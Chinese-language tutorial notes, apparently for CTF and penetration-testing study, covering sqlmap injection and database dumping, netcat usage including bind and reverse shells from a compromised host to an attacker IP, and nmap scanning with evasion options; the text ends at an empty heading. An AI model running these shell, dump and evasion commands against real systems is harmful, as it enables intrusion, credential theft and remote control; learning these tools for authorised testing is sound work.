# 工具使用

## sqlmap工具

### sqlmap简介

sqlmap支持五种不同的注入模式：

1. 基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
2. 基于时间的盲注，即不能根据页面的返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
3. 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
4. 联合查询注入，可以使用union的情况下的注入。
5. 堆查询注入，可以同时执行多条语句的执行时的注入。

### sqlmap支持的数据库

`mysql、oracle、postgresql、Microsoft SQL server、Microsoft access、IBM DB2、sqlite、Firebird, Sybase和SAP MaxDB`

### 检测注入

+ **基本格式**

~~~
get格式：
sqlmap -u "http://xxxx.xxx/index.php?id=x" 
默认使用level1检测全部数据库类型
sqlmap -u "http://xxx.xxx/index.php?id=x" --dbms mysql --level 3
指定数据库类型为mysql 级别为3（共5级，级别越高，检测越全面）
~~~

+ **跟随302跳转**

  当注入页面错误的时候，自动跳转到另一个页面的时候需要跟随302，当注入错误的时候，先报错再跳转的时候，不需要跟随302。目的：要追踪到错误信息。

+ **cookie注入**

~~~
当程序有防止get注入的时候，可以使用cookie注入
sqlmap -u "http://xxx.xxx/index.php" --cookie  “id=11” –level 2（只有level达到2才会检测cookie）
~~~

+ **post数据包注入**

~~~
可以使用burpsuite工具抓取post数据包
sqlmap -r "post数据包存放路径" -p "注入参数"  
~~~

### 注入成功后

+ **获取数据库基本信息**

~~~sql
sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 –dbs
查询有哪些数据库
sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test –tables
查询test数据库中有哪些表
sqlmap -u “http://www.vuln.cn/post.php?id=1”  –dbms mysql –level 3 -D test -T admin –columns
查询test数据库中admin表有哪些字段
sqlmap -u "http://xxx.xxx/index.php?id=X" -D test -T admin -C "username,password" --dump
dump出字段username与password中的数据
~~~

+ **从数据库中搜索字段**

~~~
sqlmap -r "文件路径" -D "数据库名" --search -C admin,password 
在数据库中搜索字段admin与password
~~~

+ **读取与写入文件**

~~~
	首先需要找个网站的物理路径，其次需要有可写或可读的权限
	--file-read=RFILE 从后端的数据库管理系统文件系统读取文件（物理路径）
	--file-wirte=WFILE 编辑后端的数据库管理系统文件系统上的本地文件
	--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径

~~~

### sqlmap详细命令

+ **常用命令**

  + `--is-dba`:  当前用户权限（是否为root权限）
  + `--dbs`:   枚举所有数据库
  + `--current-db`:  显示网站当前数据库
  + `--users`:  枚举所有数据库用户
  + `--current-user`：显示当前数据库用户
  + `--random-agent`： 构造随机user-agent
  + `--passwords`： 显示数据库密码
  + `proxy http://xxx.xxx  --threads 10 `：(可以 自定义线程加速)代理
  + `--time-sec`: DBMS响应的延迟时间（默认为5秒）   

+ **options(选项)：**

  + `--version`：显示sqlmap的版本号

  + `-h、--help`：显示帮助信息

  + `-v `： VERBOSE 详细级别：0-6（默认为1）

  + ~~~
    保存进度继续跑：
    sqlmap -u "网址" --dbs-o "sqlmap.log"  保存进度
    sqlmap -u "网址"  --dbs-o "sqlmap.log"  --resume 恢复已保存进度
    
    ~~~

+ **Target(目标)：**

  以下至少需要设置其中一个选项，设置目标URL:

  + `-d`：直接连接到数据库
  + `-u`:  URL 连接目标 URL
  + `-l`:  LIST 从burpsuite或者WebScarab代理的日志中解析目标
  + `-r`:  REQUESTFILE  从一个文件中载入http请求
  + `-g`:  处理Google dork的结果作为目标URL
  + `-c`:  CONFIGFILE  从INI配置文件中加载选项

+ **Request（请求）**：

  这些选项可以用来指定如果连接到目标URL

  + `--data=DATA`:  通过post发送的数据字符串
  + `--cookie=COOKIE`:  http cookie头
  + `--cookie-urlencode`:  URL编码生成的cookie注入
  + `--drop-set-cookie`： 忽略响应的set-cookie头信息
  + `--user-agent=AGENT`:  指定http User-Agent头
  + `--random-agent`： 使用随机选定的http user-agent头
  + `--referer=REFERER`：指定http Referer头
  + `--headers=HEADERS`:  换行分开，加入其他的http头
  + `--auth-type=ATYPE`:  http身份验证类型（基本、摘要或NTLM）
  + `--auth-cred=ACRED`:  http身份验证凭据
  + `--auth-cert=ACERT`:  http 认证证书
  + `--proxy=PROXY`:  使用http代理身份链接到目标URL
  + `--proxy-cred=PCRED`:  http代理身份验证凭据（用户名：密码）
  + `--ignore-proxy`：忽略系统默认的http代理
  + `--delay=DELAY`:  在每个http请求之间的延迟时间，单位为秒
  + `--timeout=TIMEOUT`:  等待连接超时的时间（默认为30秒）
  + `--retries=RETRIES` :  连接超时后重新连接的时间（默认为3秒）
  + `--scope=SCOPE`： 从所提供的代理日志中过滤目标的正则表达式
  + `--safe-url=SAFURL`:  在测试过程中经常访问的URL地址
  + `--safe-freq=SAFREQ` :  两次访问之间测试请求，给出安全的URL

+ **Enumeration（枚举）：**

  这些选项可以用来枚举后端数据库管理系统的信息、表中的结构以及数据。此外，也可以运行自己的sql语句。

  + `-b、--banner`:  检索数据库管理系统的标识
  + `--current-user`： 检索数据库管理系统当前用户
  + `--current-db`： 检索数据库管理系统当前数据库
  + `--is-dba`:  检测DBMS当前用户是否是root权限
  + `--users`:  枚举数据库管理系统所有用户
  + `--passwords`:  枚举数据库管理系统用户密码哈希值
  + `--privileges`:  枚举数据库管理系统用户的权限
  + `--roles`： 枚举数据库管理系统用户的角色
  + `--dbs`： 枚举数据库管理系统数据库
  + `-D `:  要进行枚举的指定数据库名
  + `-T`： 要进行枚举的指定数据库表名
  + `--tables`：枚举指定数据库中的表
  + `--columns`:  枚举指定表中的字段
  + `--dump`:  转储数据库管理系统的数据库中的表项
  + `--dump-all`:  转储所有的数据库表中的条目
  + `--search`： 搜索列，表或者数据库名称
  + `-C`： 要进行枚举的数据库列
  + `-U`:  用来进行枚举的数据库用户
  + `--exclude-sysdbs`:枚举表时排除系统数据库
  + `--sql-query`:  要执行的sql语句
  + `--sql-shell`:  提示交互式sql的shell

+ **Optimization(优化)：**

  这些选项可用于优化sqlmap的性能

  + `-o`： 开启所有的优化开关
  + `--predict-output`:  预测常见的查询输出
  + `--keep-alive`:  使用持久的http(s)连接
  + `--null-connection`:  从没有实际的http响应体中检索页面长度
  + `--threads`:  最大的http（s）请求并发量（默认为1）

+ **Injection（注入）**

  这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本

  + `-p`:  可测试注入的参数
  + `--dbms`:  强制后端的DBMS为此值
  + `–os`:  强制后端的DBMS操作系统为这个值
  + `--prefix`： 注入payload字符串前缀
  + `--suffix`：   注入payload字符串后缀
  + `–tamper`：  使用给定的脚本（S）篡改注入数据

+ **Detection(检测)：**

  这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。

  + `--level`： 执行测试的等级（1-5，默认为1）
  + `--risk`：执行测试的风险（0-3，默认为1）
  + `--string`:  查询时有效时在页面匹配字符串
  + `--regexp`:  查询时有效时在页面匹配正则表达式
  + `--text-only` :  仅基于在文本内容比较网页

+ **Techniques(技巧)：**

  这些选项可用于调整具体的SQL注入测试。

  + `--technique`:  sql注入技术测试（默认时BEUST）
  + `--time-sec`:  数据库管理系统响应的延迟时间（默认为5秒）
  + `--union-cols`:  定列范围用于测试union查询注入
  + `--union-char`:  用于暴力猜解列数的字符

+ **Fingerprint(指纹):**

  `-f, –fingerprint`:   执行检查广泛的DBMS版本指纹

## nc(NetCat瑞士军刀)

### 简介

​		**Netcat** 常称为 nc，拥有“瑞士军刀”的美誉。nc 小巧强悍，可以读写TCP或UDP网络连接，它被设计成一个可靠的后端工具，能被其它的程序或脚本直接驱动。同时，它又是一个功能丰富的网络调试和开发工具，因为它可以建立你可能用到的几乎任何类型的连接，以及一些非常有意思的内建功能，它基于socket协议工作。在渗透测试领域，我们通常利用它来反弹shell。

### 主要功能

+ Telnet功能
+ 获取banner信息
+ 传输文本信息
+ 传输文件/目录
+ 加密传输文件，默认不加密
+ 远程控制
+ 加密所有流量
+ 流媒体服务器
+ 远程克隆硬盘

### 常用命令

+ `-u`：使用UDP协议传输
+ `-l`：开启监听
+ `-p`：指定端口
+ `-n`：以数字形式代表ip
+ `-v`：显示执行命令过程
+ `-t`：以telnet形式应答
+ `-z`：不进行交互，直接显示结果
+ `-w`：设置超时时间
+ `-e`：程序重定向

### 常见的用法

#### 端口扫描

如果想单纯的端口扫描的话，使用其他工具如nmap会更好。nc端口扫描最主要的用途是：当我们获得了一个网站的权限之后，我们想再渗透进该网站的内网进行渗透。然而我们的nmap工具是不能扫描到内网的。所以这时我们可以把nc上传到web服务器上，利用他来扫描内网主机。而由于nc体积很小，所以不容易被发现。

![image-20210501113359424](C:/Users/Administrator/Desktop/md%25E7%25AC%2594%25E8%25AE%25B0%25E8%25B5%2584%25E6%2596%2599/CTF-WEB%25E7%25AF%2587.assets/image-20210501113359424.png)

#### 聊天

我们可以利用nc做一个简易版本的聊天工具，通过一边监听端口，一边发送消息去该端口，形成一个简易版本的服务端——客户端模型。

**服务器端**

~~~sh
nc -lvp 39990 #监听39990端口 -l 监听  -v 显示详细信息  -p 指定端口
~~~

**客户端**

~~~shell
nc -nv 39.***.***.*** 39990 #连接到服务器的39990端口 -n 以数字的形式显示 -v显示详信息
~~~

![image-20210501114205551](C:/Users/Administrator/Desktop/md%25E7%25AC%2594%25E8%25AE%25B0%25E8%25B5%2584%25E6%2596%2599/CTF-WEB%25E7%25AF%2587.assets/image-20210501114205551.png)![image-20210501114312206](C:/Users/Administrator/Desktop/md%25E7%25AC%2594%25E8%25AE%25B0%25E8%25B5%2584%25E6%2596%2599/CTF-WEB%25E7%25AF%2587.assets/image-20210501114312206.png)

#### 文件传输

我们可以利用nc往客户端传送文件

**服务器端**：

~~~shell
nc -vlp 39990 < a.txt
~~~

**客户端**：

~~~sh
nc -nv 39.***.***.*** 39990 > a.txt
~~~

![image-20210501115413602](C:/Users/Administrator/Desktop/md%25E7%25AC%2594%25E8%25AE%25B0%25E8%25B5%2584%25E6%2596%2599/CTF-WEB%25E7%25AF%2587.assets/image-20210501115413602.png)![image-20210501115531080](C:/Users/Administrator/Desktop/md%25E7%25AC%2594%25E8%25AE%25B0%25E8%25B5%2584%25E6%2596%2599/CTF-WEB%25E7%25AF%2587.assets/image-20210501115531080.png)

![image-20210501115505312](C:/Users/Administrator/Desktop/md%25E7%25AC%2594%25E8%25AE%25B0%25E8%25B5%2584%25E6%2596%2599/CTF-WEB%25E7%25AF%2587.assets/image-20210501115505312.png)

#### 反弹shell

> **正向连接，意思就是我们主动连接肉鸡**
>
> 假如我们入侵到了一台主机上，我们可以通过执行以下命令将该主机的cmd(shell)权限弹到39990端口上

**肉鸡**

~~~sh
nc -lvp 39990 -t -e cmd.exe
~~~

然后我们的主机访问该肉鸡的39990端口

**我们的主机**

~~~shell
nc -nv 39.***.***.*** 39990
~~~

![image-20210501120711457](C:/Users/Administrator/Desktop/md%25E7%25AC%2594%25E8%25AE%25B0%25E8%25B5%2584%25E6%2596%2599/CTF-WEB%25E7%25AF%2587.assets/image-20210501120711457.png)

![image-20210501120755104](C:/Users/Administrator/Desktop/md%25E7%25AC%2594%25E8%25AE%25B0%25E8%25B5%2584%25E6%2596%2599/CTF-WEB%25E7%25AF%2587.assets/image-20210501120755104.png)

> 反向连接，意思就是我们监听端口，然后肉鸡主动连接到我们的主机

**我们的主机**

~~~sh
nc -vlp 39990
~~~

**肉鸡**

~~~sh
nc -nv -t -c 192.168.1.129 39990
~~~

![image-20210501122347282](C:/Users/Administrator/Desktop/md%25E7%25AC%2594%25E8%25AE%25B0%25E8%25B5%2584%25E6%2596%2599/CTF-WEB%25E7%25AF%2587.assets/image-20210501122347282.png)

![image-20210501122435969](C:/Users/Administrator/Desktop/md%25E7%25AC%2594%25E8%25AE%25B0%25E8%25B5%2584%25E6%2596%2599/CTF-WEB%25E7%25AF%2587.assets/image-20210501122435969.png)

#### 蜜罐

> 作为蜜罐，一直监听39990端口，直到Ctrl+C停止

~~~sh
nc -lp 39990 > log.txt   #监听8888端口，并且将日志信息写入log.txt中
~~~

## nmap

### 简介

Nmap (“Network Mapper(网络映射器)”) 是一款开放源代码的 网络探测和安全审核的工具。它的设计目标是快速地扫描大型网络，当然用它扫描单个 主机也没有问题。Nmap以新颖的方式使用原始IP报文来发现网络上有哪些主机，那些 主机提供什么服务(应用程序名和版本)，那些服务运行在什么操作系统(包括版本信息)， 它们使用什么类型的报文过滤器/防火墙，以及一堆其它功能。虽然Nmap通常用于安全审核， 许多系统管理员和网络管理员也用它来做一些日常的工作，比如查看整个网络的信息， 管理服务升级计划，以及监视主机和服务的运行。

Nmap输出的是扫描目标的列表，以及每个目标的补充信息，至于是哪些信息则依赖于所使用的选项。 “所感兴趣的端口表格”是其中的关键。那张表列出端口号，协议，服务名称和状态。状态可能是 `open`(开放的)，`filtered`(被过滤的)， `closed`(关闭的)，或者`unfiltered`(未被过滤的)。 Open(开放的)意味着目标机器上的应用程序正在该端口监听连接/报文。 `filtered`(被过滤的) 意味着防火墙，过滤器或者其它网络障碍阻止了该端口被访问，Nmap无法得知 它是 `open`(开放的) 还是 `closed`(关闭的)。 `closed`(关闭的) 端口没有应用程序在它上面监听，但是他们随时可能开放。 当端口对Nmap的探测做出响应，但是Nmap无法确定它们是关闭还是开放时，这些端口就被认为是 `unfiltered`(未被过滤的) 如果Nmap报告状态组合 `open|filtered` 和 `closed|filtered`时，那说明Nmap无法确定该端口处于两个状态中的哪一个状态。 当要求进行版本探测时，端口表也可以包含软件的版本信息。当要求进行IP协议扫描时 (`-sO`)，Nmap提供关于所支持的IP协议而不是正在监听的端口的信息。



> **端口状态：**
>
> Open:表示端口处于开放状态
>
> Closed:表示端口处于关闭状态
>
> Filterd:表示端口处于过滤无法收到返回的probe状态
>
> UnFilterd：表示端口收到返回的probe，但是无法确认
>
> Open/UnFilterd: 表示端口处于开放或者是未过滤状态
>
> Closed/UnFilterd：表示端口处于关闭或者未过滤状态

nmap进行探测之前要把域名通过DNS服务器解析为IP地址，我们也可以使用指定的DNS服务器进行解析。使用--dns-servers参数来指定。

### 常用命令

~~~c#
1. nmap -sT 192.168.96.4  //TCP连接扫描，不安全，慢

2. nmap -sS 192.168.96.4  //SYN扫描,使用最频繁，安全，快

3. nmap -Pn 192.168.96.4  //目标机禁用ping，绕过ping扫描

4. nmap -sU 192.168.96.4  //UDP扫描,慢,可得到有价值的服务器程序

5. nmap -sI 僵尸ip 目标ip  //使用僵尸机对目标机发送数据包

6. nmap -sA 192.168.96.4  //检测哪些端口被屏蔽

7. nmap 192.168.96.4 -p <portnumber>  //对指定端口扫描

8. nmap 192.168.96.1/24 //对整个网段的主机进行扫描

9. nmap 192.168.96.4 -oX myscan.xml //对扫描结果另存在myscan.xml

10. nmap -T1~6 192.168.96.4  //设置扫描速度，一般T4足够。

11. nmap -sV 192.168.96.4  //对端口上的服务程序版本进行扫描

12. nmap -O 192.168.96.4  //对目标主机的操作系统进行扫描

13. nmap -sC <scirptfile> 192.168.96.4  //使用脚本进行扫描，耗时长

14. nmap -A 192.168.96.4  //强力扫描，耗时长

15. nmap -6 ipv6地址   //对ipv6地址的主机进行扫描

16. nmap -f 192.168.96.4  //使用小数据包发送，避免被识别出

17. nmap –mtu <size> 192.168.96.4 //发送的包大小,最大传输单元必须是8的整数

18. nmap -D <假ip> 192.168.96.4 //发送参杂着假ip的数据包检测

19. nmap --source-port <portnumber> //针对防火墙只允许的源端口

20. nmap –data-length: <length> 192.168.96.4 //改变发生数据包的默认的长度，避免被识别出来是nmap发送的。

21. nmap -v 192.168.96.4  //显示冗余信息(扫描细节)

22. nmap -sn 192.168.96.4  //对目标进行ping检测，不进行端口扫描（会发送四种报文确定目标是否存活,）

23. nmap -sP 192.168.96.4  //仅仅对目标进行ping检测。

24. nmap -n/-p 192.168.96.4  //-n表示不进行dns解析，-p表示要

25. nmap --system-dns 192.168.96.4  //扫描指定系统的dns服务器

26. nmap –traceroute 192.168.96.4  //追踪每个路由节点。

27. nmap -PE/PP/PM: 使用ICMP echo, timestamp, and netmask 请求包发现主机。

28. nmap -sP 192.168.96.4       //主机存活性扫描，arp直连方式。

29. nmap -iR [number]       //对随机生成number个地址进行扫描。
~~~

### 目标说明

除了选项，所有出现在Nmap命令行上的都被视为对目标主机的说明。最简单的情况是指定一个目标IP地址或者主机名。

有时候您希望扫描整个网络的相邻主机。为此，Nmap支持CIDR风格的地址。您可以附加 一个/*`<numbit>`*在一个IP地址或主机名后面， Nmap将会扫描所有和该参考IP地址具有 *`<numbit>`*相同比特的所有IP地址或主机。 例如，192.168.10.0/24将会扫描192.168.10.0 (二进制格式: `11000000 10101000 00001010 00000000`)和192.168.10.255 (二进制格式: `11000000 10101000 00001010 11111111`)之间的256台主机。 192.168.10.40/24 将会做同样的事情。假设主机 scanme.nmap.org的IP地址是205.217.153.62， scanme.nmap.org/16 将扫描205.217.0.0和205.217.255.255之间的65,536 个IP地址。 所允许的最小值是/1， 这将会扫描半个互联网。最大值是/32，这将会扫描该主机或IP地址， 因为所有的比特都固定了。

CIDR标志位很简洁但有时候不够灵活。例如，您也许想要扫描 192.168.0.0/16，但略过任何以.0或者.255 结束的IP地址，因为它们通常是广播地址。 Nmap通过八位字节地址范围支持这样的扫描 您可以用逗号分开的数字或范围列表为IP地址的每个八位字节指定它的范围。 例如，192.168.0-255.1-254 将略过在该范围内以.0和.255结束的地址。 范围不必限于最后的8位：0-255.0-255.13.37 将在整个互联网范围内扫描所有以13.37结束的地址。 这种大范围的扫描对互联网调查研究也许有用。

IPv6地址只能用规范的IPv6地址或主机名指定。 CIDR 和八位字节范围不支持IPv6，因为它们对于IPv6几乎没什么用。

Nmap命令行接受多个主机说明，它们不必是相同类型。命令**nmap scanme.nmap.org 192.168.0.0/8 10.0.0，1，3-7.0-255**将和您预期的一样执行。

虽然目标通常在命令行指定，下列选项也可用来控制目标的选择：

+ `-iL<inputfilename>`(从列表中输入)
  + 从 *`<inputfilename>`*中读取目标说明。在命令行输入 一堆主机名显得很笨拙，然而经常需要这样。 例如，您的DHCP服务器可能导出10,000个当前租约的列表，而您希望对它们进行 扫描。如果您*不是*使用未授权的静态IP来定位主机，或许您想要扫描所有IP地址。 只要生成要扫描的主机的列表，用`-iL` 把文件名作为选项传给Nmap。列表中的项可以是Nmap在 命令行上接受的任何格式(IP地址，主机名，CIDR，IPv6，或者八位字节范围)。 每一项必须以一个或多个空格，制表符或换行符分开。 如果您希望Nmap从标准输入而不是实际文件读取列表， 您可以用一个连字符(`-`)作为文件名。

+ `-iR <hostnum>` (随机选择目标)
  + 对于互联网范围内的调查和研究， 您也许想随机地选择目标。 *`<hostnum>`* 选项告诉 Nmap生成多少个IP。不合需要的IP如特定的私有，组播或者未分配的地址自动 略过。选项 `0` 意味着永无休止的扫描。记住，一些网管对于未授权的扫描可能会很感冒并加以抱怨。 使用该选项的后果自负! 如果在某个雨天的下午，您觉得实在无聊， 试试这个命令**nmap -sS -PS80 -iR 0 -p 80**随机地找一些网站浏览。

+ `--exclude <host1[，host2][，host3]，...>` (排除主机/网络)
  + 如果在您指定的扫描范围有一些主机或网络不是您的目标， 那就用该选项加上以逗号分隔的列表排除它们。该列表用正常的Nmap语法， 因此它可以包括主机名，CIDR，八位字节范围等等。 当您希望扫描的网络包含执行关键任务的服务器，已知的对端口扫描反应强烈的系统或者被其它人看管的子网时，这也许有用。

+ `--excludefile <excludefile>` (排除文件中的列表)
  + 这和`--exclude` 选项的功能一样，只是所排除的目标是用以换行符空格或者制表符分隔的`excludefile>`提供的，而不是在命令行上输入的。

### 主机发现

